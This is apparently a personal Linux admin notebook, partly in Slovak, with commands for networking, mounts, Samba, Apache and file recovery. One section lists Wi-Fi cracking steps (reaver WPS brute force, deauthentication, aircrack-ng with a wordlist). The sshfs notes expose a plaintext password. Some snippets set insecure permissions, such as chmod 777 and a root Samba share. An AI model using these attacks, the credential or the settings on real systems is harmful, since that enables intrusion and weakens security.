# Disable / Enable eth0
~~~
#!/bin/bash  
clear
echo "Initiating script."
ifdown Wired_connection_1
echo "Done!"

#!/bin/bash  
echo "Initiating script."
ifup Wired_connection_1
echo "Done!"
~~~

# Mount vbox shared folder on linux
Do not do: mount -t vboxsf -o uid=1000,gid=1000 VMs-shared /mnt
- /mnt remains empty

If I try to do this after: root@fhsw-web:/mnt# mount -t vboxsf -o uid=1000,gid=1000 VMs-shared /mnt/VMs-shared
It will throw: mount: /mnt/VMs-shared: mount point does not exist.

Check current mounts: root@fhsw-web:/mnt# mount
Try to unmount: root@fhsw-web:/# umount VMs-shared
Throws: /mnt: target is busy.
Need to exit that folder: root@fhsw-web:/mnt# cd ..

Repeat: root@fhsw-web:/# umount VMs-shared

Do properly: root@fhsw-web:/# mount -t vboxsf -o uid=1000,gid=1000 VMs-shared /mnt/VMs-shared

# Install .deb file with dpkg
sudo dpkg -i ~/Downloads/*.deb

# Make root prompt red
~~~
PS1='${debian_chroot:+($debian_chroot)}\[\033[01;31m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
~~~

http://www.mogilowski.net/lang/en-us/2011/12/29/color-bash-prompt-on-ubuntu-and-debian/
Edit ”/root/.bashrc” and change ”force_color_prompt=yes” like for your user

#Linux root password recovery
- Boot into recovery mode (via advanced options in GRUB)
- select root
- type the normal password
- mount -rw -o remount /
root@ubuntu:~# passwd jorge
Enter new UNIX password:
Retype new UNIX password:
passwd: password updated successfully
root@ubuntu:~# reboot

Normal login.

# Links 
http://www.server-world.info/en/note?os=CentOS_7&p=x&f=2
https://www.samba.org/samba/docs/man/Samba-HOWTO-Collection/install.html#id2551914
http://www.djvuviewer.com/
http://askubuntu.com/questions/187243/how-to-mount-a-samba-share-at-boot-time
http://www.ghacks.net/2009/04/19/auto-mounting-a-samba-share-in-linux/
wiki.centos.org/TipsAndTricks/WindowsShares#head-9d5b00e8e14089e8970de5f7a047616a32feb376
http://tldp.org/HOWTO/Bash-Prog-Intro-HOWTO-2.html#ss2.1
https://www.linkedin.com/pulse/network-automation-via-python-mostafa-hassan
https://pynet.twb-tech.com
http://packetpushers.net/intro-python-network-automation/
https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html
https://unix.stackexchange.com/questions/92715/can-i-transfer-files-using-ssh
https://www.howtoforge.com/tutorial/clamav-ubuntu/
https://askubuntu.com/questions/909273/clamav-error-var-log-clamav-freshclam-log-is-locked-by-another-process
https://www.clamav.net/documents/installing-clamav#debian
https://www.pcworld.com/article/208720/how_to_fix_a_windows_infection_using_linux.html
https://www.howtoforge.com/community/threads/debian-vi-vim-color-syntax.13715/
https://wiki.debian.org/iptables
http://forums.justlinux.com/showthread.php?70876-iptables-basics
https://www.linuxquestions.org/questions/linux-security-4/failed-ssh-login-attempts-340366/?perpage=15
https://www.linuxquestions.org/questions/linux-security-4/ssh-tricks-any-way-to-block-failed-attempts-by-ip-address-342359/
https://www.bitvise.com/getting-started-hardening-ssh-server
https://security.stackexchange.com/questions/21027/invalid-users-trying-to-log-in-to-my-server
https://www.raspberrypi.org/documentation/linux/usage/users.md
https://lists.blocklist.de/lists/ssh.txt
https://raspberrypi.stackexchange.com/questions/29399/strange-ip-connected-to-ssh
https://stackoverflow.com/questions/15190391/ssh-directory-not-being-created
https://wiki.ubuntu.com/SystemdForUpstartUsers
https://bugs.kde.org/show_bug.cgi?id=339866
https://askubuntu.com/questions/307/how-can-ppas-be-removed
https://en.wikipedia.org/wiki/FreeBSD
https://en.wikipedia.org/wiki/PfSense
http://www.dslreports.com/forum/r31134636-Routers-PfSense-or-EdgeRouter
http://www.dslreports.com/forum/network
https://stackoverflow.com/questions/7005713/how-to-compile-a-c-program-in-linux
https://askubuntu.com/questions/61408/what-is-a-command-to-compile-and-run-c-programs
www.tecmint.com/best-linux-ide-editors-source-code-editors/
http://xmodulo.com/good-ide-for-c-cpp-linux.html
https://stackoverflow.com/questions/24109/c-ide-for-linux
www.alexeyshmalko.com/2014/using-vim-as-c-cpp-ide/

# Free BSD stuff
https://www.freebsd.org/doc/handbook/users-synopsis.html
https://www.freebsd.org/doc/en_US.ISO8859-1/articles/new-users/adding-a-user.html
https://www.unixmen.com/freebsd-vs-openbsd/
https://www.freebsd.org/doc/handbook/bsdinstall-post.html
https://serverfault.com/questions/58363/my-unqualified-host-name-foo-bar-unknown-problem
https://www.freebsd.org/doc/en_US.ISO8859-1/articles/linux-users/shells.html
https://www.freebsd.org/doc/en_US.ISO8859-1/articles/linux-users/article.html
https://www.freebsd.org/doc/handbook/shells.html
https://www.cyberciti.biz/faq/freebsd-bash-installation/
https://www.cyberciti.biz/faq/freebsd-install-sudo-command/
https://www.disk-partition.com/gpt-mbr/mbr-vs-gpt-1004.html


# Notepad alternatives for Linux
https://itsfoss.com/notepad-alternatives-for-linux/

###Notepadqq
sudo add-apt-repository ppa:notepadqq-team/notepadqq
sudo apt-get update
sudo apt-get install notepadqq

###Geany 
sudo apt-get install geany scite

###Sublime
sudo add-apt-repository ppa:webupd8team/sublime-text-2
sudo apt-get update
sudo apt-get install sublime-text

# Correction of Share already in use 
The network folder specified is currently mapped using a different user name and password", when trying to connect to a drive remotely

net use /delete \\server\share

# Samba sharing root folder
[root$]
path = /
create mask = 0755
force user = root
browsable = yes

# IRC client
https://irssi.org/download/

# Janciho stary github
https://github.com/yafw/curses-vbox-manager

# wlan 802.11 tech
airmon-ng start wlan0
airodump-ng wlan0
vyberes bssid toho coho chces hacknut
airodump-ng -c tocojepodpismenomCH --bssid bssid mon0
to mas na to ked chces zhadzovat konkretne zariadenia
ked mas zkopirovane to bssid
reaver -i mon0 -b bssid -vv -c topodCH

Z wordlistu....heslo musi byt len slovo: 
http://www.youtube.com/watch?v=AlE6U3iQMTk
1) airmon-ng start wlan0
2) ifconfig mon0 down
3) macchanger -r mon0
4) ifconfig mon0 up
5) airodump-ng mon0
6) airodump-ng -c 5 -w WPACRACK --bssid FF:17:6A:EA:70:FF --ivs mon0
7) aireplay-ng -0 100 -e testwlan mon0
8) aircrack-ng -w /usr/share/wordlists/rockyou.txt WPACRACK-01.ivs

If aireplay-ng say that the channel is not correct
1) ifconfig mon0 down
2) iwconfig mon0 channel 6
3) ifconfig mon0 up

# Important commands
Disk operations:
df -h
mount
fdisk -l

Photorec:
photorec /dev/"disk_name"
photorec /dev/vda2


Sshfs:
sshfs research@mirror.digmia.com:/home/research /mnt
password: tomaszboril.2015
-- issue mount for check, if it's mounted

ERROR:
fuse: bad mount point - Transport endpoint is not connected
FIX: 
kill sshfs processes > pkill sshfs ??
unmount it > umount -l /mnt (as root)
mount it > sshfs research@mirror.digmia.com:/home/research /mnt
-- issue mount for check, if it's mounted


Copy from research@mirror.digmia.com:
scp /mnt/Webhostingy/recup_dir.1/filename.type ~/Desktop 
scp /mnt/Webhostingy/recup_dir.1/* /home/bubu/Desktop/Webhostingy/recup_dir.1

ERROR:
cp: omitting directory ‘/mnt/Websupport/recup_dir.1’
FIX:
scp -r /mnt/Websupport/recup_dir.1 /home/bubu/Desktop/Websupport/


List directories/files:
find ./ -type d

Directory & file size:
du -sh directory ENTER
ls -sh filename

Delete directory with files:
rm -rf "folder.name"

Rename directory:
mv old-dir-name new-dir-name
mv /path/to/old /path/to/new

Killing process:
sudo pkill "process_name"
Process_name = napr. kate, ping ....

Looking for keywords:
grep -i -E "pass|card|number|admin|root" *
* = all files in currect directory
-E = all keywords in "..."

Charakterizacia vsetkych fileov:
find . -type f -exec file {} \;

Remove all files of one type in all folders:
rm -rf */*.png

Shutdown PC:
shutdown -h now

# Important programt
Grub customizer:
  sudo add-apt-repository ppa:danielrichter2007/grub-customizer
  sudo apt-get update
  sudo apt-get install grub-customizer

Gparted:
  sudo apt-get install gparted
  
Sshfs:
  sudo apt-get install sshfs

TestDisk:
  sudo apt-get install testdisk

# Chmod & Chown
bubu@Bravo1:~/Desktop$ sudo -s
root@Bravo1:~/Desktop# chown root rec
root@Bravo1:~/Desktop# chmod 777 rec -R
root@Bravo1:~/Desktop# ls -la rec

# Apache2 config
no, praveze nic, povolis AllowOverride na All z None v /etc/apache2/apache2.conf, dalej v /etc/php5/apache2/php.ini zmenis display_error na On, dalej do konzoli napises sudo a2enmod rewrite a to by mala byt asi cela ta zakladna konfiguracia apachu
[12:01] <c04n0s> este samozrejme chmod -R 777 /var/www

sudo apt-get purge apache* php* mysql* phpmyadmin && sudo apt-get autoremove && sudo apt-get install apache2 php5 php5-mysql mysql-server phpmyadmin

[12:20] <c04n0s> sudo dpkg-reconfigure mysql-server
[12:20] <c04n0s> potom
[12:20] <c04n0s> sudo dpkg-reconfigure phpmyadmin
[12:41] <c04n0s> najprv skus sudo service apache2 restart
[12:41] <c04n0s> najprv skus sudo service mysqld restart

http://stackoverflow.com/questions/1420839/cant-connect-to-mysql-server-error-111
http://www.itnetwork.cz/ubuntu-konfigurace-lampp

# Screen
screen
enter
top
ctrl ad - detach
vypnem konzolu
screen -r   ,, je tam :)

# Sietovy konfig - old
vim:
pisem stlacenim INSERT
vypnem pisanie ESC
zatvorim a ulozim 	:wq

(v konzole prepinam ALT a sipky)


konfiguracia eth0 

vim /etc/network/interfaces
vi -||-

reset sietoveho adapteru
sudo invoke-rc.d networking restart

uprava DNSiek
vim /etc/resolv.conf

